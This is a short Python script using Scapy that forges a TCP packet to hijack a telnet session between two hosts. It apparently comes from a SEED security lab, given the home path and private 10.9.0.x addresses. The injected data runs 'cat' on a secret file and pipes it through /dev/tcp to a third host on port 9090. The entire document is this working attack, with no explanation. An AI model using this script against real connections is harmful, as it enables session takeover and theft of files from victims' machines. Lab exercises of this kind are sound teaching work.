#!/usr/bin/python3
import sys
from scapy.all import *

print("Sending session hijacking packet .....")

IP_src = "10.9.0.5"
IP_dst = "10.9.0.6"
src_p = 48212
dst_p = 23
seq_num = 196869204
ack_num = 275913571

IP_layer = IP( src=IP_src, dst=IP_dst )
TCP_layer = TCP( sport=src_p, dport=dst_p, flags="A", seq=seq_num, ack=ack_num )
DATA = "\r cat /home/seed/secret>/dev/tcp/10.9.0.1/9090 \r"

hijack_pkt = IP_layer/TCP_layer/DATA

send( hijack_pkt, verbose=0 )
